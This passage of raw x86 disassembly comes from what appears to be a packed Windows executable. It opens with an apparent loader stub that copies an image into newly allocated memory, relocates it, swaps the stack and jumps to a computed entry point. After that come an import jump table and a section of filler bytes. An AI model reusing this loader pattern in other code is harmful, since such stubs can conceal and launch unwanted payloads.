  451686:	mov    edx,DWORD PTR [ebp-0x64]
  451689:	push   edx
  45168a:	mov    eax,DWORD PTR [ebp-0x20]
  45168d:	push   eax
  45168e:	call   0x451270
  451693:	add    esp,0x8
  451696:	mov    ecx,DWORD PTR [ebp-0x38]
  451699:	mov    edx,DWORD PTR [ebp-0x20]
  45169c:	mov    DWORD PTR [ecx],edx
  45169e:	push   0x42000
  4516a3:	call   0x451140
  4516a8:	add    esp,0x4
  4516ab:	mov    DWORD PTR [ebp-0xc],eax
  4516ae:	push   0x3f800
  4516b3:	mov    eax,DWORD PTR [ebp-0x38]
  4516b6:	push   eax
  4516b7:	mov    ecx,DWORD PTR [ebp-0xc]
  4516ba:	add    ecx,0x300
  4516c0:	push   ecx
  4516c1:	call   0x451c98
  4516c6:	add    esp,0xc
  4516c9:	mov    edx,DWORD PTR [ebp-0xc]
  4516cc:	sub    edx,0x400000
  4516d2:	push   edx
  4516d3:	mov    eax,DWORD PTR [ebp-0xc]
  4516d6:	push   eax
  4516d7:	mov    ecx,DWORD PTR [ebp-0x20]
  4516da:	push   ecx
  4516db:	call   0x451370
  4516e0:	add    esp,0xc
  4516e3:	mov    esp,DWORD PTR ds:0x453b34
  4516e9:	pop    eax
  4516ea:	mov    eax,DWORD PTR [ebp-0xc]
  4516ed:	add    eax,0x3f7e0
  4516f2:	mov    ds:0x453b38,eax
  4516f7:	jmp    0x451700
  4516fc:	mov    esp,ebp
  4516fe:	pop    ebp
  4516ff:	ret    
  451700:	push   ebp
  451701:	mov    ebp,esp
  451703:	pop    eax
  451704:	pop    eax
  451705:	mov    ecx,DWORD PTR ds:0x453b38
  45170b:	jmp    ecx
  45170d:	pop    ebp
  45170e:	ret    
  45170f:	jmp    DWORD PTR ds:0x4524e4
  451715:	jmp    DWORD PTR ds:0x4524e8
  45171b:	jmp    DWORD PTR ds:0x4524ec
  451721:	jmp    DWORD PTR ds:0x4524f0
  451727:	jmp    DWORD PTR ds:0x4524f4
  45172d:	jmp    DWORD PTR ds:0x4524fc
  451733:	jmp    DWORD PTR ds:0x452500
  451739:	jmp    DWORD PTR ds:0x452504
  45173f:	jmp    DWORD PTR ds:0x452508
  451745:	jmp    DWORD PTR ds:0x45250c
  45174b:	jmp    DWORD PTR ds:0x452510
  451751:	jmp    DWORD PTR ds:0x452514
  451757:	jmp    DWORD PTR ds:0x452518
  45175d:	jmp    DWORD PTR ds:0x45251c
  451763:	jmp    DWORD PTR ds:0x452520
  451769:	jmp    DWORD PTR ds:0x452524
  45176f:	jmp    DWORD PTR ds:0x452528
  451775:	jmp    DWORD PTR ds:0x45252c
  45177b:	jmp    DWORD PTR ds:0x452530
  451781:	jmp    DWORD PTR ds:0x452534
  451787:	jmp    DWORD PTR ds:0x452538
  45178d:	jmp    DWORD PTR ds:0x45253c
  451793:	jmp    DWORD PTR ds:0x452540
  451799:	jmp    DWORD PTR ds:0x452544
  45179f:	jmp    DWORD PTR ds:0x452548
  4517a5:	jmp    DWORD PTR ds:0x45254c
  4517ab:	jmp    DWORD PTR ds:0x452550
  4517b1:	jmp    DWORD PTR ds:0x452554
  4517b7:	jmp    DWORD PTR ds:0x452558
  4517bd:	jmp    DWORD PTR ds:0x45255c
  4517c3:	jmp    DWORD PTR ds:0x452560
  4517c9:	jmp    DWORD PTR ds:0x452564
  4517cf:	jmp    DWORD PTR ds:0x452568
  4517d5:	jmp    DWORD PTR ds:0x45256c
  4517db:	jmp    DWORD PTR ds:0x452570
  4517e1:	jmp    DWORD PTR ds:0x452574
  4517e7:	jmp    DWORD PTR ds:0x452578
  4517ed:	jmp    DWORD PTR ds:0x45257c
  4517f3:	jmp    DWORD PTR ds:0x452580
  4517f9:	jmp    DWORD PTR ds:0x452584
  4517ff:	jmp    DWORD PTR ds:0x452588
  451805:	jmp    DWORD PTR ds:0x45258c
  45180b:	jmp    DWORD PTR ds:0x452590
  451811:	jmp    DWORD PTR ds:0x452594
  451817:	jmp    DWORD PTR ds:0x452598
  45181d:	jmp    DWORD PTR ds:0x45259c
  451823:	jmp    DWORD PTR ds:0x4525a0
  451829:	jmp    DWORD PTR ds:0x4525a4
  45182f:	jmp    DWORD PTR ds:0x4525a8
  451835:	jmp    DWORD PTR ds:0x4525ac
  45183b:	jmp    DWORD PTR ds:0x4525b0
  451841:	jmp    DWORD PTR ds:0x4525b4
  451847:	jmp    DWORD PTR ds:0x4525b8
  45184d:	jmp    DWORD PTR ds:0x4525bc
  451853:	jmp    DWORD PTR ds:0x4525c0
  451859:	jmp    DWORD PTR ds:0x4525c4
  45185f:	jmp    DWORD PTR ds:0x4525c8
  451865:	jmp    DWORD PTR ds:0x4525cc
  45186b:	jmp    DWORD PTR ds:0x4525d0
  451871:	jmp    DWORD PTR ds:0x4525d4
  451877:	jmp    DWORD PTR ds:0x4525d8
  45187d:	jmp    DWORD PTR ds:0x4525dc
  451883:	jmp    DWORD PTR ds:0x4525e0
  451889:	jmp    DWORD PTR ds:0x4525e4
  45188f:	jmp    DWORD PTR ds:0x4525e8
  451895:	jmp    DWORD PTR ds:0x4525ec
  45189b:	jmp    DWORD PTR ds:0x4525f0
  4518a1:	jmp    DWORD PTR ds:0x4525f4
  4518a7:	jmp    DWORD PTR ds:0x4525f8
  4518ad:	jmp    DWORD PTR ds:0x4525fc
  4518b3:	jmp    DWORD PTR ds:0x452600
  4518b9:	jmp    DWORD PTR ds:0x452604
  4518bf:	jmp    DWORD PTR ds:0x452608
  4518c5:	jmp    DWORD PTR ds:0x45260c
  4518cb:	jmp    DWORD PTR ds:0x452610
  4518d1:	jmp    DWORD PTR ds:0x452614
  4518d7:	jmp    DWORD PTR ds:0x452618
  4518dd:	jmp    DWORD PTR ds:0x45261c
  4518e3:	jmp    DWORD PTR ds:0x452620
  4518e9:	jmp    DWORD PTR ds:0x452624
  4518ef:	jmp    DWORD PTR ds:0x452628
  4518f5:	jmp    DWORD PTR ds:0x45262c
  4518fb:	jmp    DWORD PTR ds:0x452630
  451901:	jmp    DWORD PTR ds:0x452634
  451907:	jmp    DWORD PTR ds:0x452638
  45190d:	jmp    DWORD PTR ds:0x45263c
  451913:	jmp    DWORD PTR ds:0x452640
  451919:	jmp    DWORD PTR ds:0x452644
  45191f:	jmp    DWORD PTR ds:0x452648
  451925:	jmp    DWORD PTR ds:0x45264c
  45192b:	jmp    DWORD PTR ds:0x452650
  451931:	jmp    DWORD PTR ds:0x452654
  451937:	jmp    DWORD PTR ds:0x452658
  45193d:	jmp    DWORD PTR ds:0x45265c
  451943:	jmp    DWORD PTR ds:0x452660
  451949:	jmp    DWORD PTR ds:0x452664
  45194f:	jmp    DWORD PTR ds:0x452668
  451955:	jmp    DWORD PTR ds:0x45266c
  45195b:	jmp    DWORD PTR ds:0x452670
  451961:	jmp    DWORD PTR ds:0x452674
  451967:	jmp    DWORD PTR ds:0x452678
  45196d:	jmp    DWORD PTR ds:0x45267c
  451973:	jmp    DWORD PTR ds:0x452680
  451979:	jmp    DWORD PTR ds:0x452684
  45197f:	jmp    DWORD PTR ds:0x452688
  451985:	jmp    DWORD PTR ds:0x45268c
  45198b:	jmp    DWORD PTR ds:0x452690
  451991:	jmp    DWORD PTR ds:0x452694
  451997:	jmp    DWORD PTR ds:0x452698
  45199d:	jmp    DWORD PTR ds:0x45269c
  4519a3:	jmp    DWORD PTR ds:0x4526a0
  4519a9:	jmp    DWORD PTR ds:0x4526a4
  4519af:	jmp    DWORD PTR ds:0x4526a8
  4519b5:	jmp    DWORD PTR ds:0x4526ac
  4519bb:	jmp    DWORD PTR ds:0x4526b0
  4519c1:	jmp    DWORD PTR ds:0x4526b4
  4519c7:	jmp    DWORD PTR ds:0x4526b8
  4519cd:	jmp    DWORD PTR ds:0x4526bc
  4519d3:	jmp    DWORD PTR ds:0x4526c0
  4519d9:	jmp    DWORD PTR ds:0x4526c4
  4519df:	jmp    DWORD PTR ds:0x4526c8
  4519e5:	jmp    DWORD PTR ds:0x4526cc
  4519eb:	jmp    DWORD PTR ds:0x4526d0
  4519f1:	jmp    DWORD PTR ds:0x4526d4
  4519f7:	jmp    DWORD PTR ds:0x4526d8
  4519fd:	jmp    DWORD PTR ds:0x4526dc
  451a03:	jmp    DWORD PTR ds:0x4526e0
  451a09:	jmp    DWORD PTR ds:0x4526e4
  451a0f:	jmp    DWORD PTR ds:0x4526e8
  451a15:	jmp    DWORD PTR ds:0x4526ec
  451a1b:	jmp    DWORD PTR ds:0x4526f0
  451a21:	jmp    DWORD PTR ds:0x4526f4
  451a27:	jmp    DWORD PTR ds:0x4526f8
  451a2d:	jmp    DWORD PTR ds:0x4526fc
  451a33:	jmp    DWORD PTR ds:0x452700
  451a39:	jmp    DWORD PTR ds:0x452704
  451a3f:	jmp    DWORD PTR ds:0x452708
  451a45:	jmp    DWORD PTR ds:0x45270c
  451a4b:	jmp    DWORD PTR ds:0x452710
  451a51:	jmp    DWORD PTR ds:0x452714
  451a57:	jmp    DWORD PTR ds:0x452718
  451a5d:	jmp    DWORD PTR ds:0x45271c
  451a63:	jmp    DWORD PTR ds:0x452720
  451a69:	jmp    DWORD PTR ds:0x452724
  451a6f:	jmp    DWORD PTR ds:0x452728
  451a75:	jmp    DWORD PTR ds:0x45272c
  451a7b:	jmp    DWORD PTR ds:0x452730
  451a81:	jmp    DWORD PTR ds:0x452734
  451a87:	jmp    DWORD PTR ds:0x452738
  451a8d:	jmp    DWORD PTR ds:0x45273c
  451a93:	jmp    DWORD PTR ds:0x452740
  451a99:	jmp    DWORD PTR ds:0x452744
  451a9f:	jmp    DWORD PTR ds:0x452748
  451aa5:	jmp    DWORD PTR ds:0x45274c
  451aab:	jmp    DWORD PTR ds:0x452750
  451ab1:	jmp    DWORD PTR ds:0x452754
  451ab7:	jmp    DWORD PTR ds:0x452758
  451abd:	jmp    DWORD PTR ds:0x45275c
  451ac3:	jmp    DWORD PTR ds:0x452760
  451ac9:	jmp    DWORD PTR ds:0x452764
  451acf:	jmp    DWORD PTR ds:0x452768
  451ad5:	jmp    DWORD PTR ds:0x45276c
  451adb:	jmp    DWORD PTR ds:0x452770
  451ae1:	jmp    DWORD PTR ds:0x452774
  451ae7:	jmp    DWORD PTR ds:0x452778
  451aed:	jmp    DWORD PTR ds:0x45277c
  451af3:	jmp    DWORD PTR ds:0x452780
  451af9:	jmp    DWORD PTR ds:0x452784
  451aff:	jmp    DWORD PTR ds:0x452788
  451b05:	jmp    DWORD PTR ds:0x45278c
  451b0b:	jmp    DWORD PTR ds:0x452790
  451b11:	jmp    DWORD PTR ds:0x452794
  451b17:	jmp    DWORD PTR ds:0x452798
  451b1d:	jmp    DWORD PTR ds:0x45279c
  451b23:	jmp    DWORD PTR ds:0x4527a0
  451b29:	jmp    DWORD PTR ds:0x4527a4
  451b2f:	jmp    DWORD PTR ds:0x4527a8
  451b35:	jmp    DWORD PTR ds:0x4527ac
  451b3b:	jmp    DWORD PTR ds:0x4527b0
  451b41:	jmp    DWORD PTR ds:0x4527b4
  451b47:	jmp    DWORD PTR ds:0x4527b8
  451b4d:	jmp    DWORD PTR ds:0x4527bc
  451b53:	jmp    DWORD PTR ds:0x4527c0
  451b59:	jmp    DWORD PTR ds:0x4527c4
  451b5f:	jmp    DWORD PTR ds:0x4527c8
  451b65:	jmp    DWORD PTR ds:0x4527cc
  451b6b:	jmp    DWORD PTR ds:0x4527d0
  451b71:	jmp    DWORD PTR ds:0x4527d4
  451b77:	jmp    DWORD PTR ds:0x4527d8
  451b7d:	jmp    DWORD PTR ds:0x4527dc
  451b83:	jmp    DWORD PTR ds:0x4527e0
  451b89:	jmp    DWORD PTR ds:0x4527e4
  451b8f:	jmp    DWORD PTR ds:0x4527e8
  451b95:	jmp    DWORD PTR ds:0x4527ec
  451b9b:	jmp    DWORD PTR ds:0x4527f0
  451ba1:	jmp    DWORD PTR ds:0x4527f4
  451ba7:	jmp    DWORD PTR ds:0x4527f8
  451bad:	jmp    DWORD PTR ds:0x4527fc
  451bb3:	jmp    DWORD PTR ds:0x452800
  451bb9:	jmp    DWORD PTR ds:0x452804
  451bbf:	jmp    DWORD PTR ds:0x452808
  451bc5:	jmp    DWORD PTR ds:0x45280c
  451bcb:	jmp    DWORD PTR ds:0x452810
  451bd1:	jmp    DWORD PTR ds:0x452814
  451bd7:	jmp    DWORD PTR ds:0x452818
  451bdd:	jmp    DWORD PTR ds:0x45281c
  451be3:	jmp    DWORD PTR ds:0x452820
  451be9:	jmp    DWORD PTR ds:0x452824
  451bef:	jmp    DWORD PTR ds:0x452828
  451bf5:	jmp    DWORD PTR ds:0x45282c
  451bfb:	jmp    DWORD PTR ds:0x452830
  451c01:	jmp    DWORD PTR ds:0x452834
  451c07:	jmp    DWORD PTR ds:0x452838
  451c0d:	jmp    DWORD PTR ds:0x45283c
  451c13:	jmp    DWORD PTR ds:0x452840
  451c19:	jmp    DWORD PTR ds:0x452844
  451c1f:	jmp    DWORD PTR ds:0x452848
  451c25:	jmp    DWORD PTR ds:0x45284c
  451c2b:	jmp    DWORD PTR ds:0x452850
  451c31:	jmp    DWORD PTR ds:0x452854
  451c37:	jmp    DWORD PTR ds:0x452858
  451c3d:	jmp    DWORD PTR ds:0x45285c
  451c43:	jmp    DWORD PTR ds:0x452860
  451c49:	jmp    DWORD PTR ds:0x452864
  451c4f:	jmp    DWORD PTR ds:0x452868
  451c55:	jmp    DWORD PTR ds:0x45286c
  451c5b:	jmp    DWORD PTR ds:0x452870
  451c61:	jmp    DWORD PTR ds:0x452874
  451c67:	jmp    DWORD PTR ds:0x452878
  451c6d:	jmp    DWORD PTR ds:0x45287c
  451c73:	jmp    DWORD PTR ds:0x452880
  451c79:	jmp    DWORD PTR ds:0x452884
  451c7f:	jmp    DWORD PTR ds:0x452888
  451c85:	jmp    DWORD PTR ds:0x45288c
  451c8b:	jmp    DWORD PTR ds:0x452890
  451c91:	jmp    DWORD PTR ds:0x452894
  451c97:	int3   
  451c98:	jmp    DWORD PTR ds:0x45289c
  451c9e:	jmp    DWORD PTR ds:0x4528a4

Disassembly of section .text5:

00454000 <.text5>:
  454000:	add    DWORD PTR [ecx],eax
  454002:	add    DWORD PTR [ecx],eax
  454004:	add    DWORD PTR [ecx],eax
  454006:	add    DWORD PTR [ecx],eax
  454008:	add    DWORD PTR [ecx],eax
  45400a:	add    DWORD PTR [ecx],eax
  45400c:	add    DWORD PTR [ecx],eax
  45400e:	add    DWORD PTR [ecx],eax
  454010:	add    DWORD PTR [ecx],eax
  454012:	add    DWORD PTR [ecx],eax
  454014:	add    DWORD PTR [ecx],eax
  454016:	add    DWORD PTR [ecx],eax
  454018:	add    DWORD PTR [ecx],eax
  45401a:	add    DWORD PTR [ecx],eax
  45401c:	add    DWORD PTR [ecx],eax
  45401e:	add    DWORD PTR [ecx],eax
  454020:	add    DWORD PTR [ecx],eax
  454022:	add    DWORD PTR [ecx],eax
  454024:	add    DWORD PTR [ecx],eax
  454026:	add    DWORD PTR [ecx],eax
  454028:	add    DWORD PTR [ecx],eax
  45402a:	add    DWORD PTR [ecx],eax
  45402c:	add    DWORD PTR [ecx],eax
  45402e:	add    DWORD PTR [ecx],eax
  454030:	add    DWORD PTR [ecx],eax
  454032:	add    DWORD PTR [ecx],eax
  454034:	add    DWORD PTR [ecx],eax
  454036:	add    DWORD PTR [ecx],eax
  454038:	add    DWORD PTR [ecx],eax
  45403a:	add    DWORD PTR [ecx],eax
  45403c:	add    DWORD PTR [ecx],eax
  45403e:	add    DWORD PTR [ecx],eax
  454040:	add    DWORD PTR [ecx],eax
  454042:	add    DWORD PTR [ecx],eax
  454044:	add    DWORD PTR [ecx],eax
  454046:	add    DWORD PTR [ecx],eax
  454048:	add    DWORD PTR [ecx],eax
  45404a:	add    DWORD PTR [ecx],eax
  45404c:	add    DWORD PTR [ecx],eax
  45404e:	add    DWORD PTR [ecx],eax
  454050:	add    DWORD PTR [ecx],eax
  454052:	add    DWORD PTR [ecx],eax
  454054:	add    DWORD PTR [ecx],eax
  454056:	add    DWORD PTR [ecx],eax
  454058:	add    DWORD PTR [ecx],eax
  45405a:	add    DWORD PTR [ecx],eax
  45405c:	add    DWORD PTR [ecx],eax
  45405e:	add    DWORD PTR [ecx],eax
  454060:	add    DWORD PTR [ecx],eax
  454062:	add    DWORD PTR [ecx],eax
  454064:	add    DWORD PTR [ecx],eax
  454066:	add    DWORD PTR [ecx],eax
  454068:	add    DWORD PTR [ecx],eax
  45406a:	add    DWORD PTR [ecx],eax
  45406c:	add    DWORD PTR [ecx],eax
  45406e:	add    DWORD PTR [ecx],eax
  454070:	add    DWORD PTR [ecx],eax
  454072:	add    DWORD PTR [ecx],eax
  454074:	add    DWORD PTR [ecx],eax
  454076:	add    DWORD PTR [ecx],eax
  454078:	add    DWORD PTR [ecx],eax
  45407a:	add    DWORD PTR [ecx],eax
  45407c:	add    DWORD PTR [ecx],eax
  45407e:	add    DWORD PTR [ecx],eax
  454080:	add    DWORD PTR [ecx],eax
  454082:	add    DWORD PTR [ecx],eax
  454084:	add    DWORD PTR [ecx],eax
  454086:	add    DWORD PTR [ecx],eax
  454088:	add    DWORD PTR [ecx],eax
  45408a:	add    DWORD PTR [ecx],eax
  45408c:	add    DWORD PTR [ecx],eax
  45408e:	add    DWORD PTR [ecx],eax
  454090:	add    DWORD PTR [ecx],eax
  454092:	add    DWORD PTR [ecx],eax
  454094:	add    DWORD PTR [ecx],eax
  454096:	add    DWORD PTR [ecx],eax
  454098:	add    DWORD PTR [ecx],eax
  45409a:	add    DWORD PTR [ecx],eax
  45409c:	add    DWORD PTR [ecx],eax
  45409e:	add    DWORD PTR [ecx],eax
  4540a0:	add    DWORD PTR [ecx],eax
  4540a2:	add    DWORD PTR [ecx],eax
  4540a4:	add    DWORD PTR [ecx],eax
  4540a6:	add    DWORD PTR [ecx],eax
  4540a8:	add    DWORD PTR [ecx],eax
  4540aa:	add    DWORD PTR [ecx],eax
  4540ac:	add    DWORD PTR [ecx],eax
  4540ae:	add    DWORD PTR [ecx],eax
  4540b0:	add    DWORD PTR [ecx],eax
  4540b2:	add    DWORD PTR [ecx],eax
  4540b4:	add    DWORD PTR [ecx],eax
  4540b6:	add    DWORD PTR [ecx],eax
  4540b8:	add    DWORD PTR [ecx],eax
  4540ba:	add    DWORD PTR [ecx],eax
  4540bc:	add    DWORD PTR [ecx],eax
  4540be:	add    DWORD PTR [ecx],eax
  4540c0:	add    DWORD PTR [ecx],eax
  4540c2:	add    DWORD PTR [ecx],eax
  4540c4:	add    DWORD PTR [ecx],eax
  4540c6:	add    DWORD PTR [ecx],eax
  4540c8:	add    DWORD PTR [ecx],eax
  4540ca:	add    DWORD PTR [ecx],eax
  4540cc:	add    DWORD PTR [ecx],eax
  4540ce:	add    DWORD PTR [ecx],eax
  4540d0:	add    DWORD PTR [ecx],eax
  4540d2:	add    DWORD PTR [ecx],eax
  4540d4:	add    DWORD PTR [ecx],eax
  4540d6:	add    DWORD PTR [ecx],eax
  4540d8:	add    DWORD PTR [ecx],eax
  4540da:	add    DWORD PTR [ecx],eax
  4540dc:	add    DWORD PTR [ecx],eax
  4540de:	add    DWORD PTR [ecx],eax
  4540e0:	add    DWORD PTR [ecx],eax
  4540e2:	add    DWORD PTR [ecx],eax
  4540e4:	add    DWORD PTR [ecx],eax
  4540e6:	add    DWORD PTR [ecx],eax
  4540e8:	add    DWORD PTR [ecx],eax
  4540ea:	add    DWORD PTR [ecx],eax
  4540ec:	add    DWORD PTR [ecx],eax
  4540ee:	add    DWORD PTR [ecx],eax
  4540f0:	add    DWORD PTR [ecx],eax
  4540f2:	add    DWORD PTR [ecx],eax
  4540f4:	add    DWORD PTR [ecx],eax
  4540f6:	add    DWORD PTR [ecx],eax
  4540f8:	add    DWORD PTR [ecx],eax
  4540fa:	add    DWORD PTR [ecx],eax
  4540fc:	add    DWORD PTR [ecx],eax
  4540fe:	add    DWORD PTR [ecx],eax
  454100:	add    DWORD PTR [ecx],eax
  454102:	add    DWORD PTR [ecx],eax
  454104:	add    DWORD PTR [ecx],eax
  454106:	add    DWORD PTR [ecx],eax
  454108:	add    DWORD PTR [ecx],eax
  45410a:	add    DWORD PTR [ecx],eax
  45410c:	add    DWORD PTR [ecx],eax
  45410e:	add    DWORD PTR [ecx],eax
  454110:	add    DWORD PTR [ecx],eax
  454112:	add    DWORD PTR [ecx],eax
  454114:	add    DWORD PTR [ecx],eax
  454116:	add    DWORD PTR [ecx],eax
  454118:	add    DWORD PTR [ecx],eax
  45411a:	add    DWORD PTR [ecx],eax
  45411c:	add    DWORD PTR [ecx],eax
  45411e:	add    DWORD PTR [ecx],eax
  454120:	add    DWORD PTR [ecx],eax
  454122:	add    DWORD PTR [ecx],eax
  454124:	add    DWORD PTR [ecx],eax
  454126:	add    DWORD PTR [ecx],eax
  454128:	add    DWORD PTR [ecx],eax
  45412a:	add    DWORD PTR [ecx],eax
  45412c:	add    DWORD PTR [ecx],eax
  45412e:	add    DWORD PTR [ecx],eax
  454130:	add    DWORD PTR [ecx],eax
  454132:	add    DWORD PTR [ecx],eax
  454134:	add    DWORD PTR [ecx],eax
  454136:	add    DWORD PTR [ecx],eax
  454138:	add    DWORD PTR [ecx],eax
  45413a:	add    DWORD PTR [ecx],eax
  45413c:	add    DWORD PTR [ecx],eax
  45413e:	add    DWORD PTR [ecx],eax
  454140:	add    DWORD PTR [ecx],eax
  454142:	add    DWORD PTR [ecx],eax
  454144:	add    DWORD PTR [ecx],eax
  454146:	add    DWORD PTR [ecx],eax
  454148:	add    DWORD PTR [ecx],eax
  45414a:	add    DWORD PTR [ecx],eax
  45414c:	add    DWORD PTR [ecx],eax
  45414e:	add    DWORD PTR [ecx],eax
  454150:	add    DWORD PTR [ecx],eax
  454152:	add    DWORD PTR [ecx],eax
  454154:	add    DWORD PTR [ecx],eax
  454156:	add    DWORD PTR [ecx],eax
  454158:	add    DWORD PTR [ecx],eax
  45415a:	add    DWORD PTR [ecx],eax
  45415c:	add    DWORD PTR [ecx],eax
  45415e:	add    DWORD PTR [ecx],eax
  454160:	add    DWORD PTR [ecx],eax
  454162:	add    DWORD PTR [ecx],eax
  454164:	add    DWORD PTR [ecx],eax
  454166:	add    DWORD PTR [ecx],eax
  454168:	add    DWORD PTR [ecx],eax
  45416a:	add    DWORD PTR [ecx],eax
  45416c:	add    DWORD PTR [ecx],eax
  45416e:	add    DWORD PTR [ecx],eax
  454170:	add    DWORD PTR [ecx],eax
  454172:	add    DWORD PTR [ecx],eax
  454174:	add    DWORD PTR [ecx],eax
  454176:	add    DWORD PTR [ecx],eax
  454178:	add    DWORD PTR [ecx],eax
  45417a:	add    DWORD PTR [ecx],eax
  45417c:	add    DWORD PTR [ecx],eax
  45417e:	add    DWORD PTR [ecx],eax
  454180:	add    DWORD PTR [ecx],eax
  454182:	add    DWORD PTR [ecx],eax
  454184:	add    DWORD PTR [ecx],eax
  454186:	add    DWORD PTR [ecx],eax
  454188:	add    DWORD PTR [ecx],eax
  45418a:	add    DWORD PTR [ecx],eax
  45418c:	add    DWORD PTR [ecx],eax
  45418e:	add    DWORD PTR [ecx],eax
  454190:	add    DWORD PTR [ecx],eax
  454192:	add    DWORD PTR [ecx],eax
  454194:	add    DWORD PTR [ecx],eax
  454196:	add    DWORD PTR [ecx],eax
  454198:	add    DWORD PTR [ecx],eax
  45419a:	add    DWORD PTR [ecx],eax
  45419c:	add    DWORD PTR [ecx],eax
  45419e:	add    DWORD PTR [ecx],eax
  4541a0:	add    DWORD PTR [ecx],eax
  4541a2:	add    DWORD PTR [ecx],eax
  4541a4:	add    DWORD PTR [ecx],eax
  4541a6:	add    DWORD PTR [ecx],eax
  4541a8:	add    DWORD PTR [ecx],eax
  4541aa:	add    DWORD PTR [ecx],eax
  4541ac:	add    DWORD PTR [ecx],eax
  4541ae:	add    DWORD PTR [ecx],eax
  4541b0:	add    DWORD PTR [ecx],eax
  4541b2:	add    DWORD PTR [ecx],eax
  4541b4:	add    DWORD PTR [ecx],eax
  4541b6:	add    DWORD PTR [ecx],eax
  4541b8:	add    DWORD PTR [ecx],eax
  4541ba:	add    DWORD PTR [ecx],eax
  4541bc:	add    DWORD PTR [ecx],eax
  4541be:	add    DWORD PTR [ecx],eax
  4541c0:	add    DWORD PTR [ecx],eax
  4541c2:	add    DWORD PTR [ecx],eax
  4541c4:	add    DWORD PTR [ecx],eax
  4541c6:	add    DWORD PTR [ecx],eax
  4541c8:	add    DWORD PTR [ecx],eax
  4541ca:	add    DWORD PTR [ecx],eax
  4541cc:	add    DWORD PTR [ecx],eax
  4541ce:	add    DWORD PTR [ecx],eax
  4541d0:	add    DWORD PTR [ecx],eax
  4541d2:	add    DWORD PTR [ecx],eax
  4541d4:	add    DWORD PTR [ecx],eax
  4541d6:	add    DWORD PTR [ecx],eax
  4541d8:	add    DWORD PTR [ecx],eax
  4541da:	add    DWORD PTR [ecx],eax
  4541dc:	add    DWORD PTR [ecx],eax
  4541de:	add    DWORD PTR [ecx],eax
  4541e0:	add    DWORD PTR [ecx],eax
  4541e2:	add    DWORD PTR [ecx],eax
  4541e4:	add    DWORD PTR [ecx],eax
  4541e6:	add    DWORD PTR [ecx],eax
  4541e8:	add    DWORD PTR [ecx],eax
  4541ea:	add    DWORD PTR [ecx],eax
  4541ec:	add    DWORD PTR [ecx],eax
  4541ee:	add    DWORD PTR [ecx],eax
  4541f0:	add    DWORD PTR [ecx],eax
  4541f2:	add    DWORD PTR [ecx],eax
  4541f4:	add    DWORD PTR [ecx],eax
  4541f6:	add    DWORD PTR [ecx],eax
  4541f8:	add    DWORD PTR [ecx],eax
  4541fa:	add    DWORD PTR [ecx],eax
  4541fc:	add    DWORD PTR [ecx],eax
  4541fe:	add    DWORD PTR [ecx],eax
  454200:	add    DWORD PTR [ecx],eax
  454202:	add    DWORD PTR [ecx],eax
  454204:	add    DWORD PTR [ecx],eax
  454206:	add    DWORD PTR [ecx],eax
  454208:	add    DWORD PTR [ecx],eax
  45420a:	add    DWORD PTR [ecx],eax
  45420c:	add    DWORD PTR [ecx],eax
  45420e:	add    DWORD PTR [ecx],eax
  454210:	add    DWORD PTR [ecx],eax
  454212:	add    DWORD PTR [ecx],eax
  454214:	add    DWORD PTR [ecx],eax
  454216:	add    DWORD PTR [ecx],eax
  454218:	add    DWORD PTR [ecx],eax
  45421a:	add    DWORD PTR [ecx],eax
  45421c:	add    DWORD PTR [ecx],eax
  45421e:	add    DWORD PTR [ecx],eax
  454220:	add    DWORD PTR [ecx],eax
  454222:	add    DWORD PTR [ecx],eax
  454224:	add    DWORD PTR [ecx],eax
  454226:	add    DWORD PTR [ecx],eax
  454228:	add    DWORD PTR [ecx],eax
  45422a:	add    DWORD PTR [ecx],eax
  45422c:	add    DWORD PTR [ecx],eax
  45422e:	add    DWORD PTR [ecx],eax
  454230:	add    DWORD PTR [ecx],eax
  454232:	add    DWORD PTR [ecx],eax
  454234:	add    DWORD PTR [ecx],eax
  454236:	add    DWORD PTR [ecx],eax
  454238:	add    DWORD PTR [ecx],eax
  45423a:	add    DWORD PTR [ecx],eax
  45423c:	add    DWORD PTR [ecx],eax
  45423e:	add    DWORD PTR [ecx],eax
  454240:	add    DWORD PTR [ecx],eax
  454242:	add    DWORD PTR [ecx],eax
  454244:	add    DWORD PTR [ecx],eax
  454246:	add    DWORD PTR [ecx],eax
  454248:	add    DWORD PTR [ecx],eax
  45424a:	add    DWORD PTR [ecx],eax
  45424c:	add    DWORD PTR [ecx],eax
  45424e:	add    DWORD PTR [ecx],eax
  454250:	add    DWORD PTR [ecx],eax
  454252:	add    DWORD PTR [ecx],eax
  454254:	add    DWORD PTR [ecx],eax
  454256:	add    DWORD PTR [ecx],eax
  454258:	add    DWORD PTR [ecx],eax
  45425a:	add    DWORD PTR [ecx],eax
  45425c:	add    DWORD PTR [ecx],eax
  45425e:	add    DWORD PTR [ecx],eax
  454260:	add    DWORD PTR [ecx],eax
  454262:	add    DWORD PTR [ecx],eax
  454264:	add    DWORD PTR [ecx],eax
  454266:	add    DWORD PTR [ecx],eax
  454268:	add    DWORD PTR [ecx],eax
  45426a:	add    DWORD PTR [ecx],eax
  45426c:	add    DWORD PTR [ecx],eax
  45426e:	add    DWORD PTR [ecx],eax
  454270:	add    DWORD PTR [ecx],eax
  454272:	add    DWORD PTR [ecx],eax
  454274:	add    DWORD PTR [ecx],eax
  454276:	add    DWORD PTR [ecx],eax
  454278:	add    DWORD PTR [ecx],eax
  45427a:	add    DWORD PTR [ecx],eax
  45427c:	add    DWORD PTR [ecx],eax
  45427e:	add    DWORD PTR [ecx],eax
  454280:	add    DWORD PTR [ecx],eax
  454282:	add    DWORD PTR [ecx],eax
  454284:	add    DWORD PTR [ecx],eax
  454286:	add    DWORD PTR [ecx],eax
  454288:	add    DWORD PTR [ecx],eax
  45428a:	add    DWORD PTR [ecx],eax
  45428c:	add    DWORD PTR [ecx],eax
  45428e:	add    DWORD PTR [ecx],eax
  454290:	add    DWORD PTR [ecx],eax
  454292:	add    DWORD PTR [ecx],eax
  454294:	add    DWORD PTR [ecx],eax
  454296:	add    DWORD PTR [ecx],eax
  454298:	add    DWORD PTR [ecx],eax
  45429a:	add    DWORD PTR [ecx],eax
  45429c:	add    DWORD PTR [ecx],eax
  45429e:	add    DWORD PTR [ecx],eax
  4542a0:	add    DWORD PTR [ecx],eax
  4542a2:	add    DWORD PTR [ecx],eax
  4542a4:	add    DWORD PTR [ecx],eax
  4542a6:	add    DWORD PTR [ecx],eax
  4542a8:	add    DWORD PTR [ecx],eax
  4542aa:	add    DWORD PTR [ecx],eax
  4542ac:	add    DWORD PTR [ecx],eax
  4542ae:	add    DWORD PTR [ecx],eax
  4542b0:	add    DWORD PTR [ecx],eax
